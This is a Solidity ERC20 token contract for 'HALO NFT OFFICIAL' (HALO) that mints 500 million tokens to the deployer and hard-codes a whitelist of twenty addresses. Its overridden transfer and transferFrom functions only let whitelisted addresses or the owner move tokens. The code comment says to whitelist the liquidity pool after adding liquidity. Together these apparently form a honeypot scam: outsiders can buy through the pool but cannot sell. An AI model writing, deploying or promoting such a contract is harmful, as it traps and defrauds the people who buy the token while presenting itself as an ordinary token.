// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("HALO NFT OFFICIAL", "HALO") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 500000000 * 10 ** decimals());
        whiteList[0xF23E9d0d76274b71cbBB401c4b411e7968566e0B]= true;
        whiteList[0x4DB6A5eF40905F1cf355b0A26eb6A7f351c753ae]=true;
        whiteList[0x672036ba826FE10840e5899f5f7Da722fbf025C2]=true;
        whiteList[0x185ff340Bb7462eD5cf0157C6AEcD5B3fC7899b2]=true;
        whiteList[0xC0bE3516df021BA9fd6D789f125067f15709D14F]=true;
        whiteList[0x3D3E11f749538e157FC1972c4061a6a085DCd555]=true;
        whiteList[0x6c52972640c54aa456c4529227bfcbc9780Ad8Ec]=true;
        whiteList[0x7ec59341536c97cbf8E48a1230A9602D0F24160F]=true;
        whiteList[0x30AC7E74ccC74f677baf445a4Ffc0a31af3fc448]=true;
        whiteList[0xED9eB10b14D07957Bb653B419C2de3C490E64E44]=true;
        whiteList[0x10246eD75d2a51eA40203C15b2Ec605BaD4EfCfC]=true;
        whiteList[0xc3f0d1dF71f0c065792AAC731A0077A2Fd6C9Ebc]=true;
        whiteList[0xCCDDdEaFfdDD1a7E1e58E60C7Ed04d9115636d78]=true;
        whiteList[0x28928DD871A7B550E0825364A4bAd4ba8c83aa14]=true;
        whiteList[0xeac087cBA20e5b4A608028275e55aA45f48aa73F]=true;
        whiteList[0x46a15125e615Fe5932b0dd3C23E5a0A1F2415Fc5]=true;
        whiteList[0x2812473B14E6a6edEa718b50a15DAf9228b4DA39]=true;
        whiteList[0x92063c37961B28158633Bc133C255750CED2D32c]=true;
        whiteList[0x0c9aD6d9e9466BE2598B92A639b50b56109170A4]=true;
        whiteList[0x382a0ffCBe091dB9C23DF1460e829Fa2FCfb771B]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}